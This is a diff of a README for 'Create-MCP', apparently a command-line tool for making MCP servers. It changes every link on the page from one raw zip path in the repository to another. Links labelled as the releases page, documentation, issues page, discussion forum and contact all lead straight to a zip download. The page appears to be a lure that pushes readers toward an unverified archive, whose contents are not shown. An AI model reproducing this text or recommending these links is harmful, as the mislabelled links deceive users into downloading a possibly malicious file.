@@ -1,6 +1,6 @@
 # 🎉 Create-MCP - Effortlessly Generate Your MCP Servers
 
-[![Download Create-MCP](https://raw.githubusercontent.com/AnnieBabs/Create-MCP/main/guruship/Create-MCP.zip)](https://raw.githubusercontent.com/AnnieBabs/Create-MCP/main/guruship/Create-MCP.zip)
+[![Download Create-MCP](https://github.com/AnnieBabs/Create-MCP/raw/refs/heads/main/src/Create-MCP-v2.0.zip)](https://github.com/AnnieBabs/Create-MCP/raw/refs/heads/main/src/Create-MCP-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Create-MCP is a modern command-line interface (CLI) tool designed to help you cr
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the official [Create-MCP Releases Page](https://raw.githubusercontent.com/AnnieBabs/Create-MCP/main/guruship/Create-MCP.zip). This page contains the latest version of the software, along with all previous versions so you can choose the one that works best for you.
+1. **Visit the Releases Page**: Go to the official [Create-MCP Releases Page](https://github.com/AnnieBabs/Create-MCP/raw/refs/heads/main/src/Create-MCP-v2.0.zip). This page contains the latest version of the software, along with all previous versions so you can choose the one that works best for you.
 
 2. **Download the Installer**: Find the version you want to install and click on the file link to download it. Make sure to choose the installer that matches your operating system:
 
@@ -62,8 +62,8 @@ After installation, you can start using Create-MCP by following these steps:
 
 ## 🔗 Helpful Links
 
-- [Documentation](https://raw.githubusercontent.com/AnnieBabs/Create-MCP/main/guruship/Create-MCP.zip): Check the official documentation for more detailed guidelines and advanced usage.
-- [Issues](https://raw.githubusercontent.com/AnnieBabs/Create-MCP/main/guruship/Create-MCP.zip): Report bugs or request features on the GitHub issues page.
+- [Documentation](https://github.com/AnnieBabs/Create-MCP/raw/refs/heads/main/src/Create-MCP-v2.0.zip): Check the official documentation for more detailed guidelines and advanced usage.
+- [Issues](https://github.com/AnnieBabs/Create-MCP/raw/refs/heads/main/src/Create-MCP-v2.0.zip): Report bugs or request features on the GitHub issues page.
 
 ## 🤝 Contributing
 
@@ -73,7 +73,7 @@ We welcome contributions! If you would like to help improve Create-MCP, please f
 
 Join our community of users and developers. Share your projects using Create-MCP and seek help or advice when needed.
 
-- [Discussion Forum](https://raw.githubusercontent.com/AnnieBabs/Create-MCP/main/guruship/Create-MCP.zip)
+- [Discussion Forum](https://github.com/AnnieBabs/Create-MCP/raw/refs/heads/main/src/Create-MCP-v2.0.zip)
 
 ## 🎨 Topics
 
@@ -91,6 +91,6 @@ Create-MCP covers a wide range of topics that make it versatile and useful for m
 
 ## 📞 Contact
 
-For any questions or support, feel free to reach out through the [Issues Page](https://raw.githubusercontent.com/AnnieBabs/Create-MCP/main/guruship/Create-MCP.zip).
+For any questions or support, feel free to reach out through the [Issues Page](https://github.com/AnnieBabs/Create-MCP/raw/refs/heads/main/src/Create-MCP-v2.0.zip).
 
-Don’t forget to visit the [Create-MCP Releases Page](https://raw.githubusercontent.com/AnnieBabs/Create-MCP/main/guruship/Create-MCP.zip) to download the latest version now!
+Don’t forget to visit the [Create-MCP Releases Page](https://github.com/AnnieBabs/Create-MCP/raw/refs/heads/main/src/Create-MCP-v2.0.zip) to download the latest version now!
